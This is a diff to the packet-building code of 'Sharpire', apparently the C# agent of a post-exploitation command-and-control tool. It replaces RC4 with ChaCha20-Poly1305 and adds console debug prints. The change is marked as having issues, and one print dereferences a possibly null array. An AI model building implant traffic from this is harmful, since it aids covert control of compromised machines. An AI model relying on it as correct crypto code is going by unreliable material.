@@ -204,15 +204,27 @@ namespace Sharpire
             data = Misc.combine(data, new byte[4] { lang, Convert.ToByte(meta), 0x00, 0x00 });
             data = Misc.combine(data, BitConverter.GetBytes(encryptedBytesLength));
 
-            byte[] initializationVector = NewInitializationVector(4);
-            byte[] rc4Key = Misc.combine(initializationVector, key);
-            byte[] routingPacketData = rc4Encrypt(rc4Key, data);
+            byte[] chacha_nonce = NewInitializationVector(12);
+            byte[] poly1305_tag = new byte[16];
+            byte[] chacha_data = new byte[data.Length];
 
-            routingPacketData = Misc.combine(initializationVector, routingPacketData);
+            // CURRENTLY HAVING ISSUES WITH THIS !!!
+            ChaCha20Poly1305 chacha = new ChaCha20Poly1305(key);
+            chacha.Encrypt(chacha_nonce, data, chacha_data, poly1305_tag, associatedData: null);
+
+            byte[] chacha_poly1305_data = Misc.combine(chacha_data, poly1305_tag);
+            byte[] routingPacketData = Misc.combine(chacha_nonce, chacha_poly1305_data);
             if (encryptedBytes != null)
             {
                 routingPacketData = Misc.combine(routingPacketData, encryptedBytes);
             }
+
+            Console.WriteLine($"Chacha nonce: (Length: {chacha_nonce.Length}): {Convert.ToHexString(chacha_nonce)}");
+            Console.WriteLine($"Chacha data: (Length: {chacha_data.Length}): {Convert.ToHexString(chacha_data)}");
+            Console.WriteLine($"Poly 1305 tag: (Length: {poly1305_tag.Length}): {Convert.ToHexString(poly1305_tag)}");
+            Console.WriteLine($"Chacha poly1305 data: (Length: {chacha_poly1305_data.Length}): {Convert.ToHexString(chacha_poly1305_data)}");
+            Console.WriteLine($"Encrypted bytes: (Length: {encryptedBytes.Length}): {Convert.ToHexString(encryptedBytes)}");
+            Console.WriteLine($"Final packet: (Length: {routingPacketData.Length}): {Convert.ToHexString(routingPacketData)}");
 
             return routingPacketData;
         }
